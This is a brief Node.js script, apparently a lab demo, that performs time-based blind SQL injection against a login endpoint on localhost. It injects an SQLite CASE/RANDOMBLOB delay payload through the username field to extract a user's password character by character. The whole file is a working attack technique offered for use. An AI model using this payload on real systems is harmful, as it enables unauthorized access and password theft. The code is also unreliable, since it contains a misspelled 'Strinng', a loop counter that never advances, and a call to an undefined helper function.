const got = require('got')

const CHAR_START = 32 // space
const CHAR_END = 126 // tilde
const URL = 'http://localhost:4000/login'
const USERNAME = process.argv[2] || 'alice'
const TIME_THRESHOLD = 50

let password = ''

init()

async function init () {
  process.stdout.write('Trying')
  let char = CHAR_START
  while (char <= CHAR_END) {
    const position = password.length + 1
    const query = `${USERNAME}" AND CASE SUBSTR(password,${position},1) WHEN CHAR(${char}) THEN 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(10000000/2)))) ELSE null END --`
    const time = await getResultWithTime(() => {
      return got(URL, {
        form: true,
        body: {
          username: query,
          password: ''
        }
      })
    })
    process.stdout.write(Strinng.fromCharCode(char))
    if (time > TIME_THRESHOLD) {
      password += String.fromCharCode(char)
      console.log(' MATCH!')
      console.log(` Password: ${password}`)
    }
  }
}